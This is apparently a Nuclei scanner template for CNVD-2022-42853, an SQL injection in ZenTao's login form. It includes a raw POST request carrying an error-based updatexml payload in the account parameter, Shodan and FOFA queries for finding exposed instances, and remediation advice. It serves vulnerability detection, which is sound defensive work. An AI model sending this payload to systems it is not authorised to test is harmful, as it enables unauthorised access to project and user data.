id: CNVD-2022-42853

info:
  name: 禅道 CMS SQL 注入漏洞（CNVD-2022-42853）
  author: ling
  severity: critical
  description: |
    禅道用户登录接口在处理 `account` 参数时存在 SQL 注入风险。模板向 `/zentao/user-login.html` 提交 `updatexml` 注入语句，并通过错误回显中的 MD5 值确认漏洞。
  impact: |
    - 攻击者可读取项目管理系统中的用户、项目、缺陷、需求和测试数据。
    - 若数据库权限过高，可能进一步写入文件或获取服务器权限。
  remediation: |
    - 升级禅道至修复版本，修复登录接口 SQL 注入问题。
    - 对登录参数使用参数化查询和统一错误处理，避免数据库错误信息回显。
    - 审计异常登录接口访问和数据库错误日志，轮换可能泄露的账号凭据。
  reference:
    - https://github.com/z92g/ZentaoSqli/blob/master/CNVD-2022-42853.go
    - https://www.cnvd.org.cn/flaw/show/CNVD-2022-42853
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
    cvss-score: 10
    cwe-id: CWE-89
    cpe: cpe:2.3:a:easycorp:zentao:*:*:*:*:*:*:*:*
  metadata:
    verified: true
    max-request: 1
    shodan-query: http.title:"zentao"
    fofa-query: "Zentao"
    product: zentao
    vendor: easycorp
  tags: cnvd,cnvd2022,zentao,sqli,vuln

variables:
  num: "999999999"

http:
  - raw:
      - |
        POST /zentao/user-login.html HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded
        Referer: {{BaseURL}}/zentao/user-login.html

        account=admin'+and++updatexml(1,concat(0x1,md5({{num}})),1)+and+'1'='1

    matchers:
      - type: word
        part: body
        words:
          - 'c8c605999f3d8352d7bb792cf3fdb25'
